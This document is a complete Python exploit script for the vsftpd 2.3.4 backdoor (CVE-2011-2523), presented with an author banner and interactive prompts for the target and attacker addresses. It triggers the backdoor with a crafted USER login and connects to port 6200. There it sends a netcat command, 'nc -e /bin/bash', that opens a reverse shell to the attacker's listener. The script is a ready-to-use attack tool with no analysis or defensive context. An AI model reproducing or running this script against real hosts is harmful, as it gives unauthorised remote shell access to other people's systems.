import socket
import time
import sys

print('=============================================================')
time.sleep(0.2)
print('*********************')
time.sleep(0.2)
print('*                                                           *')
time.sleep(0.2)
print('*     Exploit Type: (REMOTE) Backdoor command execution     *')
time.sleep(0.2)
print('*     Vuln Port: 21 (vsftpd)                                *')                        
time.sleep(0.2)
print('*     CVE: CVE-2011-2523                                    *')
time.sleep(0.2)
print('*     Version: vsftpd 2.3.4                                 *')
time.sleep(0.2)
print('*     Exploit Author: NickSecurity                          *')
time.sleep(0.2)
print('*     Group Author: D3AD_SEC                                *')
time.sleep(0.2)
print('*     Credits: None                                         *')
time.sleep(0.2)
print('*                                                           *')
time.sleep(0.2)
print('*********************')
time.sleep(0.2)
print('=============================================================')
while True:
        yes_no = input('do you want to start the exploit? Y/N: ')
        if yes_no == 'Y' or yes_no == 'yes' or yes_no == 'Yes' or yes_no == 'y':
                a = 1
                print('proceeding...')
                break
        elif yes_no == 'N' or yes_no == 'no' or yes_no == 'No' or yes_no == 'n':
                print('ok... byeeee!')
                sys.exit()
                break
        else:
                print('not a valid option...')

RHOST = input('put target ip: ')
RPORT = 21
LHOST = input('put your ip: ')
LPORT = int(input('put your listener port: '))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print('[*] connecting to target...')
time.sleep(0.5)

try:
        s.connect((RHOST, RPORT))

except:
        print('[-] target is not reachable:(')
        print('[-] quitting...')
        sys.exit()

user = 'USER nicksecurity:)'
passwd = 'PASS pass'
print('[*]looking if the target is vulnerable...')
time.sleep(0.5)
data = s.recv(1024)
data = data.decode()

if 'vsFTPd 2.3.4' in data:
        print('[+] target is vulnerable!')
        print('[*] proceeding...')
else:
        print('[-] target is not vulnerable:(')
        sys.exit()

print('[*] sending user auth...')
time.sleep(0.5)

s.sendall((user + '\n').encode())
print('[+] user auth sent!')
time.sleep(0.5)
print('[*] sending user pass auth...')
time.sleep(0.5)

s.sendall((passwd + '\n').encode())
print('[+] user pass auth sent!')
print('[+] backdoor opened at port 6200!')

s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
time.sleep(0.5)

print('[*] connecting to backdoor...')
time.sleep(0.5)

try:

        s1.connect((RHOST, 6200))
        print('[*] connected!')

except:

        print('[-] exploit falied to connect to backdoor...')
        print('[-] quitting...')
        sys.exit()

payload = f'nc -e /bin/bash {LHOST} {LPORT}' ##CHANGE IT IF YOU NEED

time.sleep(0.5)

print('[*] sending payload...')

time.sleep(0.5)
s1.sendall((payload).encode())

print('[+] payload sent!')
print('========exploit completed!========')
print('look your listener on port 9001:D')
